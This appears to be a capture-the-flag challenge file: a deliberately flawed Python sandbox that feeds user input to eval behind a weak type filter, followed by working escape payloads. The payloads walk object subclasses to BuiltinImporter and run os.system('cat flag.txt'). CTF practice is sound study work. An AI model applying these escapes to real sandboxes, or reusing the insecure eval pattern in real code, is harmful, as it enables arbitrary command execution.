
"Here is a python sandbox for you! Your goal is to read the flag at ./flag.txt"
"To help you out, heres the source!"

import ast, sys

#print(sys.version)
#with open(__file__,'r') as fd:
#    print(fd.read())

_filter = [list, tuple, int, object, str, dict, float, bytes, None] # set, bytearray, bool

def chk(string):
    try:
        val = ast.literal_eval(string)
        print("val : ", val)
        print("type(val) :", type(val))
        return type(val) not in _filter

    except ValueError as v:
        print('ValueError')
        print(v)
        return False
    except SyntaxError  as s:
        print('SyntaxError')
        print(s)
        return False

while True:
    inp = input("> ")
    print("split :", inp.split('.')[0])

    if chk(inp.split('.')[0]):
        eval(inp,{'__builtins__':None})
    else:
        print("go away")

"""

------------------
True.to_bytes(1) and [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'BuiltinImporter'][0]().load_module("builtins").__import__('os').system('cat flag.txt')

{"A"}.clear and [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'BuiltinImporter'][0]().load_module("builtins").__import__('os').system('cat flag.txt')

------------------

{"A"}.clear and [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'BuiltinImporter'][0]().load_module("builtins").__import__

"""

"""
import ast, sys
_filter = [list, tuple, int, object, str, dict, float, bytes, None]
inp = input("> ")
val = ast.literal_eval(inp.split('.')[0])
if type(val) not in _filter:
    eval(inp,{'__builtins__':None})
"""

